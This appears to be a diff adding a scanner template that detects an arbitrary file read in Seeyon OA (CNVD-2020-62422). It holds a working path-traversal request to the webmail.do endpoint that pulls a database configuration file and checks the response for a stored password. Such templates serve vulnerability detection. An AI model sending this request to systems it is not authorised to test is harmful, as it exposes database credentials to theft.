@@ -1,0 +1,28 @@
+id: seeyon-oa-readfile-cnvd-2020-62422
+info:
+  name: Seeyon OA Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Seeyon OA is vulnerable to arbitrary file read via the `webmail.do` endpoint, allowing attackers to retrieve sensitive configuration files.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-62422
+http:
+  - raw:
+      - |
+        GET /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties HTTP/1.1
+        Host: {{Hostname}}
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/x-msdownload"
+      - type: word
+        part: body
+        words:
+          - "ctpDataSource.password"
